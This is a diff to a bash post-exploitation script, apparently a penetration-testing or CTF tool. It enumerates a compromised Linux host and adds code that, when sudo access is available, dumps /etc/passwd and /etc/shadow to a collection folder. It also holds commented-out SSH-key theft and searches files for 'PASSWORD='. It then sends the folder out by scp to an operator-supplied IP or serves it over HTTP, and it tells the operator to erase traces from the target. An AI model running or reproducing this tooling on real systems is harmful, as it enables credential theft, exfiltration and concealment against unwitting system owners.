@@ -13,57 +13,101 @@ dest=""
 dest2=""
 tempfile=""
 SUDO_OUTPUT=""
+COLLECT_DIR=""
 
 # ========== Functions ==========
-do_basic_info() {  # This is a wrapped function. It allows us to call on it later just like we would a variable. It does not execute here.                                
+do_basic_info() {
     echo -e "\n${CYAN}========= Basic User Information ==========${DEF}\n"
     echo -e "${WHITE}User:${DEF} $(whoami)"
     echo -e "${WHITE}Hostname:${DEF} $(hostname)"
     echo -e "${WHITE}Groups:${DEF} $(id)"
     echo -e "${WHITE}PATH:${DEF} $PATH"
-    echo -e "${WHITE}IP addresses:${DEF} $(ip -4 -o addr show | awk '{print $4}' | cut -d/ -f1 | grep -v '^127\.')" # Gets the IP address while ignoring the loopback address 
+    echo -e "${WHITE}IP addresses:${DEF} $(ip -4 -o addr show | awk '{print $4}' | cut -d/ -f1 | grep -v '^127\.')"
 }
 
-do_basic_enum() { # Prints out some basic, but useful information about the target machine
-    while true; do # I have all the functions wrapped in a loop so if the user inputs the wrong input it does throw an error or exit
+do_basic_enum() {
+    while true; do
         read -rp "${CYAN}Do you want basic enumeration done (y/n)? If yes, enter your password when prompted: ${DEF}" answer1
         case "$answer1" in
             [Yy]*)
                 echo -e "\n${CYAN}========= Basic Enumeration ==========${DEF}\n"
                 echo -e "${WHITE}Running sudo -l${DEF}"
-                SUDO_OUTPUT=$(sudo -l 2>/dev/null) #Checks to see what we can run sudo on
+                SUDO_OUTPUT=$(sudo -l 2>/dev/null)
                 echo "$SUDO_OUTPUT"
+                # Dumping /etc/shadow and /etc/passwd to their own files
+                if echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
+                    echo -e "${GREEN}Full sudo access detected. Dumping /etc/passwd, /etc/shadow, sudoers, and root SSH keys...${DEF}"
+                    sleep 2
+
+                [[ -n "$COLLECT_DIR" ]] && {
+                    sudo cat /etc/passwd | tee "$COLLECT_DIR/passwd.txt" > /dev/null
+                    sudo cat /etc/shadow | tee "$COLLECT_DIR/shadow.txt" > /dev/null
+
+                # Dump sudoers **NOTE** -> WORKINNG THIS, CURRENTLY GETTING PERMSSION DENIED DURING EXFIL
+                #sudo cat /etc/sudoers | tee "$COLLECT_DIR/sudoers.txt" > /dev/null
+                
+
+                # Dump SSH keys if present
+                #echo -e "${WHITE}Collecting SSH keys from all user directories...${DEF}"
+                #sleep 2
+
+                # User home directories
+                #for dir in /home/*; do
+                #    if [[ -d "$dir/.ssh" ]]; then
+                #        user=$(basename "$dir")
+                #        sudo cp -r "$dir/.ssh" "$COLLECT_DIR/ssh_$user"
+                #        echo -e "${YELLOW}→ Copied $dir/.ssh to $COLLECT_DIR/ssh_$user${DEF}"
+                #    fi
+                #done
+
+                # Root's SSH keys
+                #if sudo test -d /root/.ssh; then
+                #    sudo cp -r /root/.ssh "$COLLECT_DIR/ssh_root"
+                #    echo -e "${YELLOW}→ Copied /root/.ssh to $COLLECT_DIR/ssh_root${DEF}"
+                #    sleep 2
+                #else
+                #    echo -e "${YELLOW}/root/.ssh directory not found${DEF}"
+                #    sleep 2
+                #fi
+
+                #    echo -e "${YELLOW}→ Collected files saved to $COLLECT_DIR${DEF}"
+                #    sleep 2
+                }
+                fi
+
                 echo -e "\n${WHITE}Operating System:${DEF}"
-                cat /etc/os-release #Shows operating system information
+                cat /etc/os-release
                 echo -e "\n${WHITE}Kernel:${DEF}"
                 uname -a
                 echo -e "\n${WHITE}CPU Information:${DEF}"
-                lscpu | grep -E '^Architecture:|^CPU\(s\):' #Shows architecture which may be important if you have to compile an exploit.CPU is just a nice to know.
-                break #break stops the while true loop
+                lscpu | grep -E '^Architecture:|^CPU\(s\):'
+                break
                 ;;
             [Nn]*)
                 echo "Enumeration skipped."
                 break
                 ;;
             *)
-                echo -e "${RED}Invalid input. Please enter 'y' or 'n'!${DEF}" # As we see here there is no 'break' so it'll loop again
+                echo -e "${RED}Invalid input. Please enter 'y' or 'n'!${DEF}"
                 ;;
         esac
     done
+
+# Ensure the collected files are accessible for exfil
+sudo chown -R "$(whoami):$(whoami)" "$COLLECT_DIR"
+chmod -R 644 "$COLLECT_DIR"/* 2>/dev/null
+chmod -R 755 "$COLLECT_DIR"/*/ 2>/dev/null
 }
 
 function check_sudo_gtfobins {
-    # First, try to find gtfobins.txt next to the script
     GTFO_DIR="$(dirname "$0")"
     GTFO_FILE="$GTFO_DIR/gtfobins.txt"
 
-    # If not found, use locate to find it anywhere on the system
     if [[ ! -f "$GTFO_FILE" ]]; then
         echo -e "${YELLOW}Local gtfobins.txt not found in script directory. Trying system-wide locate...${DEF}"
         GTFO_FILE=$(locate gtfobins.txt 2>/dev/null | grep -m1 'gtfobins.txt')
     fi
 
-    # If still not found, fallback to curl-based lookup
     if [[ ! -f "$GTFO_FILE" ]]; then
         echo -e "${YELLOW}Could not locate gtfobins.txt. Falling back to online GTFOBins lookup.${DEF}"
         local_only=false
@@ -93,27 +137,25 @@ function check_sudo_gtfobins {
     fi
 }
 
-
-do_lhf_enum() { # Searches for some basic, possibly exploitable information on the target machine
+do_lhf_enum() {
     while true; do
         read -rp "${CYAN}Do you want to search for low-hanging fruit (y/n)? ${DEF}" answer2
         case "$answer2" in
             [Yy]*)
                 echo -e "\n${CYAN}========= LOW-HANGING FRUIT ==========${DEF}\n"
                 if echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
-                    echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf (sudo):${DEF}" # On the function above I am saying 'If the user had ALL:ALL sudo rights to run it with sudo because we will have access to more'
+                    echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf (sudo):${DEF}"
                     sudo grep --color=always -rnw '/home' --include=\*.{txt,bak,conf} -ie "PASSWORD=" 2>/dev/null
-                    #sudo grep -rEi 'pass(word)?\s*[:=]' / --include=\*.{txt,bak,conf} 2>/dev/null # searching the entire directory for something similar to 'password'
                 else 
-                    echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf:${DEF}" # This command is for the event the account we are logged in as doesn't have sudo access
-                    grep --color=always -rnw '/home' --include=\*.{txt,bak,conf} -ie "PASSWORD=" 2>/dev/null # On both grep commands we are including files that end with .txt, .bak, and .conf
+                    echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf:${DEF}"
+                    grep --color=always -rnw '/home' --include=\*.{txt,bak,conf} -ie "PASSWORD=" 2>/dev/null
                 fi  
                 echo -e "\n${WHITE}Backup files:${DEF}"
-                find / -type f -name "*.bak" 2>/dev/null # Running the find command looking for any backup files
+                find / -type f -name "*.bak" 2>/dev/null
                 echo -e "\n${WHITE}Binaries with SUID permissions:${DEF}" 
-                find / -perm -u=s -type f 2>/dev/null # Looking for binaries with SUID permissions
+                find / -perm -u=s -type f 2>/dev/null
                 echo -e "\n${WHITE}Cron Jobs:${DEF}"
-                ls -la /etc/cron.daily/ # Looking for any daily cron jobs. Depending on the users rights, we could exploit this to gain a root shell
+                ls -la /etc/cron.daily/
                 break
                 ;;
             [Nn]*)
@@ -126,10 +168,10 @@ do_lhf_enum() { # Searches for some basic, possibly exploitable information on t
         esac
     done
 }
-# This give the user a few options on exfiltrating the output text file
+
 exfil_menu() {
-    sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$tempfile" > "$dest" # Ensures none of the color codes apear in the output file
-    rm -f "$tempfile"                                      # Removes the temporary file that was being used to save the output
+    sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$tempfile" > "$dest"
+    rm -f "$tempfile"
     echo -e "\n${WHITE}Finalizing saved output...${DEF}"
 
     echo -e "\n${CYAN}Do you want to exfiltrate the saved file (${dest2})?${DEF}"
@@ -138,44 +180,49 @@ exfil_menu() {
     echo -e "  3) Do nothing"
     while true; do
         read -rp "${CYAN}Enter your choice (1-3): ${DEF}" exfil_choice
-
         case "$exfil_choice" in
             1)
                 tgt_ip=$(ip route get 1 | awk '{print $7; exit}')
                 echo -e "${GREEN}Starting Python3 HTTP server on port 8080...${DEF}"
                 the_end
-                echo -e "${WHITE}Download with: wget http://$tgt_ip:8080/$dest2${DEF}"
-                cd "$HOME"
+                echo -e "${WHITE}Download with: wget http://$tgt_ip:8080/${dest2}${DEF}"
+                cd "$COLLECT_DIR" || exit
                 python3 -m http.server 8080
                 ;;
             2)
-                echo -e "${WHITE}SCP Push: File will be sent to your home directory.${DEF}"
+                echo -e "${WHITE}SCP Push: Directory will be sent to your home directory.${DEF}"
                 read -rp "${CYAN}Username on your box: ${DEF}" hostuser
-                read -rp "${CYAN}Your IP address: ${DEF}" hostip
+                while true; do
+                    read -rp "${CYAN}Your IP address: ${DEF}" hostip
+                    if [[ "$hostip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+                        break
+                    else
+                        echo -e "${RED}Invalid IP format. Please enter something like 192.168.1.100${DEF}"
+                    fi
+                done
                 read -rp "${CYAN}Use non-standard port? (y/n): ${DEF}" port_answer
                 if [[ $port_answer =~ ^[Yy]$ ]]; then
                     read -rp "${CYAN}Enter the custom port: ${DEF}" hostport
-                    scp -P "$hostport" "$dest" "$hostuser@$hostip:~/"
+                    scp -P "$hostport" -r "$COLLECT_DIR" "$hostuser@$hostip:~/"
                 else
-                    scp "$dest" "$hostuser@$hostip:~/"
+                    scp -r "$COLLECT_DIR" "$hostuser@$hostip:~/"
                 fi
                 the_end
                 break
                 ;;
             3)
-                echo -e "${WHITE}No exfiltration selected.Exiting.${DEF}"
+                echo -e "${WHITE}No exfiltration selected. Exiting.${DEF}"
                 the_end
                 break
                 ;;
             *)
                 echo -e "${RED}Invalid input. Please enter 1, 2, or 3!${DEF}"
-                    ;;
-                
+                ;;
         esac
     done
 }
 
-the_end () { # Some bs terminal art to be egdey 
+the_end () {
     cat << "EOF"
 
           ______
@@ -195,10 +242,9 @@ the_end () { # Some bs terminal art to be egdey
    Save it. Steal it. Own it.
 
 EOF
-echo -e "${RED}If you saved the file, be sure to confirm the successful exfiltration and remove it from the target system! Happy enumeration!${DEF}"
-echo -e "${DEF}"
+    echo -e "${RED}If you saved the file, be sure to confirm the successful exfiltration and remove it from the target system! Happy enumeration!${DEF}"
+    echo -e "${DEF}"
 }
-
 
 # ========== Main ==========
 echo -e "This script performs basic enumeration. You may choose to save the results.\n"
@@ -208,7 +254,9 @@ while true; do
     case "$save_answer" in
         [Yy]*)
             read -rp "${CYAN}Enter filename (e.g., output.txt): ${DEF}" filename
-            dest="$HOME/$filename"
+            COLLECT_DIR="$HOME/enum-dump"
+            mkdir -p "$COLLECT_DIR"
+            dest="$COLLECT_DIR/$filename"
             dest2="$filename"
             tempfile=$(mktemp)
             echo -e "${GREEN}Output will be saved to: $dest${DEF}"
@@ -234,7 +282,11 @@ echo
 do_basic_enum
 sleep 1
 echo
-check_sudo_gtfobins
+if ! echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
+    check_sudo_gtfobins
+else 
+     echo -e "${GREEN}Full sudo access detected — skipping GTFOBins lookup.${DEF}"
+fi
 sleep 1
 echo
 do_lhf_enum
@@ -244,10 +296,6 @@ if [[ $save_answer =~ ^[Yy]$ ]]; then
     exfil_menu
     sleep 1
 else
-    [[ $save_answer =~ ^[Nn]]$ ]];
     the_end
 fi
 echo
-
-
-
